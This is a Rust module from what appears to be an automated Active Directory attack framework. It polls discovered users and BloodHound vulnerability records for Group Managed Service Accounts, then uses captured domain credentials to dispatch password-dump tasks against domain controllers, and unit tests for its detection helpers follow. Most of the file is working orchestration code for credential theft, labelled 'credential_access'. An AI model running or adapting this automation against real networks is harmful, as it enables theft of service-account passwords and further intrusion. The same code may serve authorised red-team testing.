//! auto_gmsa_extraction -- dump gMSA passwords when gMSA accounts are found.
//!
//! Group Managed Service Accounts (gMSA) store their passwords in Active
//! Directory in the `msDS-ManagedPassword` attribute. Any principal with read
//! access can retrieve the plaintext password. When we discover users whose
//! names end with `$` and whose descriptions mention "managed service account"
//! (or via BloodHound gMSA edges), we dispatch `gmsa_dump_passwords`.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Returns `true` if the username and description indicate a gMSA account.
///
/// gMSA accounts typically end with `$` and have "managed service" in their
/// description, or their name contains "gmsa".
fn is_gmsa_account(username: &str, description: &str) -> bool {
    username.ends_with('$')
        && (description.to_lowercase().contains("managed service")
            || username.to_lowercase().contains("gmsa"))
}

/// Returns `true` if the vulnerability type is a gMSA candidate.
fn is_gmsa_vuln_type(vuln_type: &str) -> bool {
    let vtype = vuln_type.to_lowercase();
    vtype == "gmsa" || vtype == "gmsa_reader" || vtype == "readgmsapassword"
}

/// Monitors for gMSA accounts and dispatches password extraction.
/// Interval: 30s.
pub async fn auto_gmsa_extraction(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let work: Vec<GmsaWork> = {
            let state = dispatcher.state.read().await;

            // Need at least one credential to query AD for gMSA passwords
            if state.credentials.is_empty() {
                continue;
            }

            let mut gmsa_accounts: Vec<GmsaWork> = Vec::new();
            let mut seen_accounts = std::collections::HashSet::new();

            // Path 1: Detect from discovered users (original path)
            for user in &state.users {
                if !is_gmsa_account(&user.username, &user.description) {
                    continue;
                }

                let key = format!(
                    "{}:{}",
                    user.domain.to_lowercase(),
                    user.username.to_lowercase()
                );
                if state.is_processed(DEDUP_GMSA_ACCOUNTS, &key)
                    || !seen_accounts.insert(key.clone())
                {
                    continue;
                }

                let cred = match state
                    .credentials
                    .iter()
                    .find(|c| c.domain.to_lowercase() == user.domain.to_lowercase())
                {
                    Some(c) => c.clone(),
                    None => continue,
                };

                let dc_ip = match state
                    .domain_controllers
                    .get(&user.domain.to_lowercase())
                    .cloned()
                {
                    Some(ip) => ip,
                    None => continue,
                };

                gmsa_accounts.push(GmsaWork {
                    dedup_key: key,
                    gmsa_account: user.username.clone(),
                    domain: user.domain.clone(),
                    dc_ip,
                    credential: cred,
                });
            }

            // Path 2: Detect from discovered vulnerabilities (BloodHound edges)
            // BloodHound may report gMSA reader edges or gMSA-related vulns
            for vuln in state.discovered_vulnerabilities.values() {
                if !is_gmsa_vuln_type(&vuln.vuln_type) {
                    continue;
                }
                if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                    continue;
                }

                let gmsa_account = match vuln
                    .details
                    .get("target")
                    .or_else(|| vuln.details.get("gmsa_account"))
                    .or_else(|| vuln.details.get("account_name"))
                    .and_then(|v| v.as_str())
                {
                    Some(a) => a.to_string(),
                    None => continue,
                };

                let reader = vuln
                    .details
                    .get("source")
                    .or_else(|| vuln.details.get("reader"))
                    .and_then(|v| v.as_str());

                let domain = vuln
                    .details
                    .get("domain")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string();

                let key = format!("{}:{}", domain.to_lowercase(), gmsa_account.to_lowercase());
                if state.is_processed(DEDUP_GMSA_ACCOUNTS, &key)
                    || !seen_accounts.insert(key.clone())
                {
                    continue;
                }

                // Find credential for the reader (who has ReadGMSAPassword)
                let cred = reader
                    .and_then(|r| {
                        state.credentials.iter().find(|c| {
                            c.username.to_lowercase() == r.to_lowercase()
                                && (domain.is_empty()
                                    || c.domain.to_lowercase() == domain.to_lowercase())
                        })
                    })
                    .or_else(|| {
                        state.credentials.iter().find(|c| {
                            !domain.is_empty() && c.domain.to_lowercase() == domain.to_lowercase()
                        })
                    });

                let cred = match cred {
                    Some(c) => c.clone(),
                    None => continue,
                };

                let dc_ip = match state
                    .domain_controllers
                    .get(&domain.to_lowercase())
                    .cloned()
                {
                    Some(ip) => ip,
                    None => continue,
                };

                gmsa_accounts.push(GmsaWork {
                    dedup_key: key,
                    gmsa_account,
                    domain,
                    dc_ip,
                    credential: cred,
                });
            }

            gmsa_accounts
        };

        for item in work {
            let payload = json!({
                "technique": "gmsa_dump_passwords",
                "target_ip": item.dc_ip,
                "domain": item.domain,
                "gmsa_account": item.gmsa_account,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("gmsa");
            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        gmsa_account = %item.gmsa_account,
                        domain = %item.domain,
                        "gMSA password dump dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_GMSA_ACCOUNTS, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_GMSA_ACCOUNTS, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(gmsa = %item.gmsa_account, "gMSA task deferred by throttler");
                }
                Err(e) => {
                    warn!(err = %e, gmsa = %item.gmsa_account, "Failed to dispatch gMSA dump")
                }
            }
        }
    }
}

struct GmsaWork {
    dedup_key: String,
    gmsa_account: String,
    domain: String,
    dc_ip: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;

    // ─── is_gmsa_account ────────────────────────────────────────────────────

    #[test]
    fn test_is_gmsa_account_managed_service_description() {
        assert!(is_gmsa_account(
            "svc_web$",
            "Managed Service Account for web servers"
        ));
    }

    #[test]
    fn test_is_gmsa_account_gmsa_in_username() {
        assert!(is_gmsa_account("gmsa_svc$", "some service account"));
    }

    #[test]
    fn test_is_gmsa_account_case_insensitive_description() {
        assert!(is_gmsa_account(
            "svc_sql$",
            "MANAGED SERVICE account for SQL"
        ));
    }

    #[test]
    fn test_is_gmsa_account_case_insensitive_username() {
        assert!(is_gmsa_account("GMSA_SVC$", "regular account"));
    }

    #[test]
    fn test_is_gmsa_account_no_dollar_suffix() {
        // Must end with $
        assert!(!is_gmsa_account(
            "svc_web",
            "Managed Service Account for web"
        ));
    }

    #[test]
    fn test_is_gmsa_account_dollar_but_no_indicators() {
        // Ends with $ but no "managed service" in description and no "gmsa" in name
        assert!(!is_gmsa_account("svc_sql$", "regular computer account"));
    }

    #[test]
    fn test_is_gmsa_account_regular_user() {
        assert!(!is_gmsa_account("administrator", "Built-in admin account"));
    }

    #[test]
    fn test_is_gmsa_account_empty_description_with_gmsa_name() {
        assert!(is_gmsa_account("gmsa_backup$", ""));
    }

    #[test]
    fn test_is_gmsa_account_empty_description_without_gmsa_name() {
        assert!(!is_gmsa_account("svc_backup$", ""));
    }

    // ─── is_gmsa_vuln_type ──────────────────────────────────────────────────

    #[test]
    fn test_is_gmsa_vuln_type_gmsa() {
        assert!(is_gmsa_vuln_type("gmsa"));
    }

    #[test]
    fn test_is_gmsa_vuln_type_gmsa_reader() {
        assert!(is_gmsa_vuln_type("gmsa_reader"));
    }

    #[test]
    fn test_is_gmsa_vuln_type_readgmsapassword() {
        assert!(is_gmsa_vuln_type("readgmsapassword"));
    }

    #[test]
    fn test_is_gmsa_vuln_type_case_insensitive() {
        assert!(is_gmsa_vuln_type("GMSA"));
        assert!(is_gmsa_vuln_type("GMSA_READER"));
        assert!(is_gmsa_vuln_type("ReadGMSAPassword"));
    }

    #[test]
    fn test_is_gmsa_vuln_type_negative() {
        assert!(!is_gmsa_vuln_type("rbcd"));
        assert!(!is_gmsa_vuln_type("laps"));
        assert!(!is_gmsa_vuln_type("constrained_delegation"));
        assert!(!is_gmsa_vuln_type("esc1"));
        assert!(!is_gmsa_vuln_type("gmsa_something_else"));
        assert!(!is_gmsa_vuln_type(""));
    }

    // ─── dedup key construction ─────────────────────────────────────────────

    #[test]
    fn test_dedup_gmsa_accounts_value() {
        assert_eq!(DEDUP_GMSA_ACCOUNTS, "gmsa_accounts");
    }

    #[test]
    fn test_dedup_key_format() {
        let domain = "contoso.local";
        let username = "gmsa_svc$";
        let key = format!("{}:{}", domain.to_lowercase(), username.to_lowercase());
        assert_eq!(key, "contoso.local:gmsa_svc$");
    }

    #[test]
    fn test_dedup_key_normalizes_case() {
        let key = format!(
            "{}:{}",
            "FABRIKAM.LOCAL".to_lowercase(),
            "GMSA_SVC$".to_lowercase()
        );
        assert_eq!(key, "fabrikam.local:gmsa_svc$");
    }
}
